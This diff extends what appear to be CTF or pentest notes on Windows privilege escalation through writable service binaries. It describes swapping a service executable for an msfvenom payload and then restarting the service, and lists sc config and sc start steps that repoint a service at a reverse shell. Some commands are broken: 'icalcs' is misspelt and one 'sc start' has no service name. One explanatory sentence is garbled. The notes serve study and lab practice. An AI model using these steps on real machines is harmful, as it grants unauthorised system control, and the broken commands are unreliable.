@@ -1517,14 +1517,35 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ## Services
 
+<aside>
+💡 For Finding all important files in Windows:(CTF Style)
+    <b>GPGOrchestrator</b>(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Users [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
+</aside>
+```powershell
+# Check the above information why I used GPGOrchestrator to start GPGService.exe, First i replaced the GPGService.exe with msfvenom payload.
+Restart-Service 'GPGOrchestrator'
+sc start 
+```
 ### Binary Hijacking
+- I had a situation where I ran winPEASx64.exe and identified some services running with full privileges.
+- But the replaced the service netcat listener on my Kali machine but still, Listerner did not catch it.
+
 
 ```powershell
+#Finding the right service
+Get-WmiObject -Class Win32_Service -Filter "Name='GPGService'"
+# And you can find the all the services
+Get-WmiObject -Class Win32_Service
+
 #Identify service from winpeas
 icalcs "path" #F means full permission, we need to check we have full access on folder
 sc qc <servicename> #find binarypath variable
 sc config <service> <option>="<value>" #change the path to the reverseshell location
 sc start <servicename>
+Restart-Service <servicename>
 ```
 
 ### Unquoted Service Path
